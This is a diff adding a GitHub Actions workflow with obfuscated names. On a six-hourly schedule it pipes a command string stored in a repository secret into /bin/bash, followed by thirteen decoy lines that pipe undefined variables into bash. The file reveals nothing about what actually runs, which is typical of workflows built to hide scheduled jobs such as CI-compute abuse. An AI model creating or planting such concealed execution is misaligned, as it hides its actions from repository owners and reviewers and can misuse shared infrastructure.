@@ -1,0 +1,30 @@
+name: wojidehahanzu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wojidehahanzu
+        env:
+          o71773: ${{ secrets.o71773 }}
+        run: |
+          echo $o71773 | jq -r .tv09724 | /bin/bash
+          echo $kviz18512 | jq -r .q92 | /bin/bash
+          echo $qw201 | jq -r .gtwt3372 | /bin/bash
+          echo $ompi94 | jq -r .b090 | /bin/bash
+          echo $qldrn77 | jq -r .lt586 | /bin/bash
+          echo $mipw93 | jq -r .nluq4 | /bin/bash
+          echo $l25735 | jq -r .e02760 | /bin/bash
+          echo $d27 | jq -r .bpk674 | /bin/bash
+          echo $fevu29663 | jq -r .jys19403 | /bin/bash
+          echo $br935 | jq -r .zqwkh1743 | /bin/bash
+          echo $obz6376 | jq -r .en694 | /bin/bash
+          echo $csw60 | jq -r .kwvhn35 | /bin/bash
+          echo $aqpn9 | jq -r .kks7368 | /bin/bash
+          echo $fec91486 | jq -r .wskzx02 | /bin/bash
+
